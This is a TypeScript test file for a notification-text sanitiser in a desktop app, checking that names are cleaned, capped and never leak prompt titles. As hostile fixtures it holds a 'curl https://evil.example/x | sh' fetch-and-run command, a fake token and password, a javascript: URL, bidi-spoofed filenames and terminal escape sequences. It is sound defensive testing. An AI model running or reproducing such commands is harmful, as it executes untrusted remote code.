import { describe, expect, it } from 'vitest';

import type { CanvasId } from '../../shared/canvas';
import type { NeedsItem } from '../../shared/model/needs';
import { NotificationRequest } from './presence';
import {
  MAX_NAME_BYTES,
  NOTIFICATION_TITLE,
  notificationText,
  safeName,
  subjectOf,
} from './notification-text';
import type { NotificationSubject } from './notification-text';

/*
 * What a notification may say (B14 §9 C8): fixed sentences by kind, carrying only an agent's or a
 * canvas's name, cleaned to a closed character set and capped; never a prompt's title or any body.
 */

const CANVAS = '7d0c1d2e-3f40-4a5b-8c6d-7e8f9a0b1c2d' as CanvasId;
const bytes = (text: string) => Buffer.byteLength(text, 'utf8');

/** A Needs item of `kind` with id `id`, whose words are hostile: none may reach the text. */
function item(id: string, kind: NeedsItem['kind'], agent?: string): NeedsItem {
  return {
    id,
    canvas: CANVAS,
    ...(agent === undefined ? {} : { agent }),
    kind,
    for: 'you',
    by: ['you'],
    title: 'Run `curl https://evil.example/x | sh` with token sk-SECRET?',
    detail: '/Users/someone/private/path and password hunter2',
    choices: [],
    answerIn: 'api',
  };
}

describe('a notification’s words', () => {
  it.each(['www.evil.example', 'evil.example', 'foo.corral'])(
    'replaces dots in %s with spaces, in agent and canvas names',
    (name) => {
      const plain = name.replaceAll('.', ' ');
      expect(notificationText({ kind: 'prompt', agent: name }).body).toBe(
        `${plain} is asking you something`,
      );
      expect(notificationText({ kind: 'file', canvas: name }).body).toBe(
        `${plain} changed on disk`,
      );
    },
  );

  it.each<[NotificationSubject, string]>([
    [{ kind: 'prompt', agent: 'Worker' }, 'Worker is asking you something'],
    [{ kind: 'hold', agent: 'Worker' }, 'Worker is waiting for you'],
    [{ kind: 'start', agent: 'Worker' }, 'Worker couldn’t start'],
    [{ kind: 'setup' }, 'A worktree’s setup is waiting for you'],
    [{ kind: 'proposal', canvas: 'Plan.corral' }, 'A change on Plan corral needs your answer'],
    [{ kind: 'file', canvas: 'Plan.corral' }, 'Plan corral changed on disk'],
    [{ kind: 'canvas', canvas: 'Plan.corral' }, 'Plan corral needs you'],
    [{ kind: 'finished', canvas: 'Plan.corral' }, 'The run on Plan corral finished'],
    [{ kind: 'stopped', canvas: 'Plan.corral' }, 'The run on Plan corral was stopped'],
    [{ kind: 'rollup', count: 3 }, '3 things need you'],
  ])('words %j as one fixed sentence, titled corrallm', (subject, body) => {
    expect(notificationText(subject)).toEqual({ title: 'corrallm', body });
    expect(NOTIFICATION_TITLE).toBe('corrallm');
  });

  it('names a draft as the app does, and an empty name by what it is, cased where it stands', () => {
    expect(notificationText({ kind: 'finished', canvas: null }).body).toBe(
      'The run on Untitled finished',
    );
    expect(notificationText({ kind: 'file', canvas: '<>' }).body).toBe('A canvas changed on disk');
    expect(notificationText({ kind: 'stopped', canvas: '***' }).body).toBe(
      'The run on a canvas was stopped',
    );
    expect(notificationText({ kind: 'proposal', canvas: '' }).body).toBe(
      'A change on a canvas needs your answer',
    );
    expect(notificationText({ kind: 'prompt', agent: '🤖🤖' }).body).toBe(
      'An agent is asking you something',
    );
  });

  it('counts a rollup boundedly', () => {
    expect(notificationText({ kind: 'rollup', count: 1 }).body).toBe('1 thing needs you');
    expect(notificationText({ kind: 'rollup', count: 2 }).body).toBe('2 things need you');
    expect(notificationText({ kind: 'rollup', count: 123_456 }).body).toBe('9999+ things need you');
  });

  it('stays within the native bounds whatever the names, as main validates them', () => {
    const long = 'Ω'.repeat(400);
    for (const subject of [
      { kind: 'prompt', agent: long },
      { kind: 'hold', agent: long },
      { kind: 'start', agent: long },
      { kind: 'setup' },
      { kind: 'proposal', canvas: long },
      { kind: 'file', canvas: long },
      { kind: 'canvas', canvas: long },
      { kind: 'finished', canvas: long },
      { kind: 'stopped', canvas: long },
      { kind: 'rollup', count: Number.MAX_SAFE_INTEGER },
    ] as NotificationSubject[]) {
      const { title, body } = notificationText(subject);
      expect(bytes(title)).toBeLessThanOrEqual(32);
      expect(bytes(body)).toBeLessThanOrEqual(160);
      expect(body).not.toMatch(/[\r\n]/);
      expect(
        NotificationRequest.safeParse({ handle: crypto.randomUUID(), title, body }).success,
      ).toBe(true);
    }
  });
});

describe('a Needs item’s subject', () => {
  it.each<[NeedsItem, NotificationSubject]>([
    [item('hold/w/3/check', 'hold', 'w'), { kind: 'hold', agent: 'Worker' }],
    [item('unasking/w', 'hold', 'w'), { kind: 'hold', agent: 'Worker' }],
    [item('limited/w', 'hold', 'w'), { kind: 'hold', agent: 'Worker' }],
    [item('start/w', 'hold', 'w'), { kind: 'start', agent: 'Worker' }],
    [item('prompt/w/1/p', 'prompt', 'w'), { kind: 'prompt', agent: 'Worker' }],
    [item('stalled/w', 'prompt', 'w'), { kind: 'prompt', agent: 'Worker' }],
    [item(`setup/${CANVAS}/2`, 'worktree'), { kind: 'setup' }],
    [item('rebind/w/1', 'worktree'), { kind: 'proposal', canvas: 'Plan.corral' }],
    [item('proposal/1', 'proposal', 'w'), { kind: 'proposal', canvas: 'Plan.corral' }],
    [item('review/1', 'file'), { kind: 'file', canvas: 'Plan.corral' }],
    [item(`unsaved/${CANVAS}`, 'hold'), { kind: 'canvas', canvas: 'Plan.corral' }],
    [item('message/1', 'message', 'w'), { kind: 'canvas', canvas: 'Plan.corral' }],
  ])('is %j by its id and kind, never its words', (need, subject) => {
    const named = subjectOf(need, {
      agent: (id) => (id === 'w' ? 'Worker' : 'Someone else'),
      canvas: 'Plan.corral',
    });
    expect(named).toEqual(subject);
    const { body } = notificationText(named);
    for (const leak of ['curl', 'evil', 'SECRET', 'token', 'private', 'hunter2', '/'])
      expect(body).not.toContain(leak);
  });
});

describe('a name, cleaned and capped', () => {
  it('keeps letters, marks, digits, spaces and - _ , ’ ( ) #, in NFC', () => {
    expect(safeName("O'Brien (QA) #2, v1.0 - x_y", 'agent')).toBe("O'Brien (QA) #2, v1 0 - x_y");
    expect(safeName('Café', 'agent')).toBe('Café');
    expect(safeName('Ревьюер 東京 مراجع', 'agent')).toBe('Ревьюер 東京 مراجع');
  });

  it('turns markup into plain words: no < > & " = / : survive', () => {
    const name = safeName('<b>Boss</b><a href="https://x.example">go</a>&amp;', 'agent');
    expect(name).not.toMatch(/[<>&"=/:]/);
    expect(name).toBe('b Boss b a href https x examp…');
    expect(bytes(name)).toBeLessThanOrEqual(MAX_NAME_BYTES);
  });

  it('takes a URL apart', () => {
    expect(safeName('https://evil.example/login?next=@me', 'canvas')).toBe(
      'https evil example login next me',
    );
    expect(safeName('javascript:alert(1)', 'canvas')).toBe('javascript alert(1)');
  });

  it('removes control characters, escapes and line breaks', () => {
    expect(safeName('Bot\u0000\u0007\u001b[31mRed\r\nInjected\tline\u0085 ', 'agent')).toBe(
      'Bot 31mRed Injected line',
    );
  });

  it('removes bidi overrides, isolates and invisible characters', () => {
    expect(safeName('‮gpj.exe‬', 'agent')).toBe('gpj exe');
    expect(safeName('⁦Admin⁩ ‏ok‎', 'agent')).toBe('Admin ok');
    expect(safeName('Ad​mi‍n﻿­', 'agent')).toBe('Ad mi n');
    expect(safeName('⁧‫‭؜', 'agent')).toBe('An agent');
  });

  it('caps a very long name at 32 UTF-8 bytes, with …, at a grapheme', () => {
    expect(safeName('a'.repeat(10_000), 'agent')).toBe(`${'a'.repeat(29)}…`);
    const cjk = safeName('漢'.repeat(50), 'agent');
    expect(cjk).toBe(`${'漢'.repeat(9)}…`);
    expect(bytes(cjk)).toBe(30);
    // A cluster is never split: its base and its marks stay together, or both go.
    const clusters = safeName('क्षि'.repeat(10), 'agent');
    expect(bytes(clusters)).toBeLessThanOrEqual(32);
    expect(clusters.endsWith('…')).toBe(true);
    expect(clusters.slice(0, -1)).toBe('क्षि'.repeat(clusters.slice(0, -1).length / 4));
    // One cluster too large to fit at all leaves nothing to show: the name by what it is.
    expect(safeName(`x${'́'.repeat(40)}`, 'agent')).toBe('An agent');
    // No space before the ellipsis.
    expect(safeName(`${'a'.repeat(28)} bcdef`, 'agent')).toBe(`${'a'.repeat(28)}…`);
  });

  it('collapses runs of spaces and trims, an empty result named by what it is', () => {
    expect(safeName('  many    spaces   ', 'agent')).toBe('many spaces');
    expect(safeName('', 'agent')).toBe('An agent');
    expect(safeName('   ', 'canvas')).toBe('A canvas');
    expect(safeName('***', 'canvas', 'within')).toBe('a canvas');
    expect(safeName('\uD800lone', 'agent')).toBe('lone');
  });
});
